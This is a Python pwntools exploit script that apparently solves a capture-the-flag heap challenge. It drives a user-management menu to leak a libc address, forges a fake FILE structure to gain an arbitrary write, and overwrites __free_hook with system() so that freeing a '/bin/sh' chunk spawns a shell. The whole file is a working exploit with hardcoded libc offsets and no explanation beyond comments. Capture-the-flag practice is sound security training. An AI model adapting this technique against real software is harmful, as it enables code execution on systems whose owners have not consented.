#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

# Global variables
args = None
elf = None

def send_idx(r, index):
    r.sendlineafter(b'index\n> ', str(index).encode())

def send_size(r, size):
    r.sendlineafter(b'size\n> ', str(size).encode())

def add_user(r, index, username):
    r.sendlineafter(b'> ', str(1).encode())

    send_idx(r, index)
    r.sendafter(b'username\n> ', flat(username, filler=b'\x00', length=0x10))
    r.recvline_contains(b'success!')

def edit_data(r, index, size, data, auto_fill=True):
    r.sendlineafter(b'> ', str(2).encode())

    send_idx(r, index)
    send_size(r, size)
    if auto_fill:
        r.send(flat(data, filler=b'\xFF', length=size))
    else:
        r.send(flat(data))
    r.recvline_contains(b'success!')

def del_user(r, index, wait_for_msg=True):
    r.sendlineafter(b'> ', str(3).encode())

    send_idx(r, index)

    if wait_for_msg:
        r.recvline_contains(b'success!')

def show_users(r):
    r.sendlineafter(b'> ', str(4).encode())

    return r.recvuntil(b'1. add_user\n', drop=True)

def do_aaw(r):
    r.sendlineafter(b'> ', str(4).encode())

def attack(r):
    add_user(r, 0, b'A' * 0x10)
    add_user(r, 1, b'B' * 0x10)
    add_user(r, 2, b'C' * 0x10)
    add_user(r, 3, b'/bin/sh\x00')
    edit_data(r, 0, 0x18, b'a' * 0x18)
    gdb.attach(r)
    edit_data(r, 1, 0x18, b'b' * 0x18)
    #edit_data(r, 3, 0x18, b'd' * 0x18)

    # fclose to get a freed FILE chunk and a freed large chunk
    del_user(r, 0)

    # Leak libc information

    # Make it allocate a memory which does not present in the tcache and fastbin
    # Make sure it would cut down from unsorted bin
    # The buffer containing the fd address would be written into the data
    edit_data(r, 2, 0x88, b'\xff', auto_fill=False)

    userdata = show_users(r)
    addr_bytes = userdata.split(b'[2] ')[1].split(b'data: ')[1][0:6]
    log.debug(f"{addr_bytes}")
    # Get the page address first, then calculate the libc base address
    libc_addr = (u64(addr_bytes.ljust(8, b'\x00')) & 0xFFFFFFFFFFFFF000) - 0x1ed000
    log.info(f"libc base address: {hex(libc_addr)}")
    free_hook_addr = libc_addr + 0x1eee48
    log.info(f"free hook address: {hex(free_hook_addr)}")
    system_addr = libc_addr + 0x52290
    log.info(f"system() address: {hex(system_addr)}")

    del_user(r, 1)
    del_user(r, 2)

    aaw_addr = free_hook_addr
    aaw_size = 0x208
    buf = [
        p64(0xfbad0000 | 0x0000),
        p64(0), # _IO_read_ptr
        p64(0), # _IO_read_end
        p64(0), # _IO_read_base
        p64(0), # _IO_write_base
        p64(0), # _IO_write_ptr
        p64(0), # _IO_write_end
        p64(aaw_addr), # _IO_buf_base
        p64(aaw_addr + aaw_size), # _IO_buf_end
        p64(0), # _IO_save_base
        p64(0), # _IO_backup_base
        p64(0), # _IO_save_end
        p64(0), # _markers
        p64(0), # _chain
        p32(0), # _fileno
        p32(0), # _flags2
    ]
    # Create a chunk with size = 0x1e0 which should get an used FILE struct.
    # And write a fake FILE struct to do arbitrary address write!
    edit_data(r, 3, 0x1d8, flat(buf), auto_fill=False)

    userdata = do_aaw(r)
    r.send(flat(p64(system_addr), filler=b'\x00', length=0x208))

    del_user(r, 3, wait_for_msg=False)

def main():
    r = process("./chal")

    attack(r)

    r.interactive()

if __name__ == '__main__':
    main()


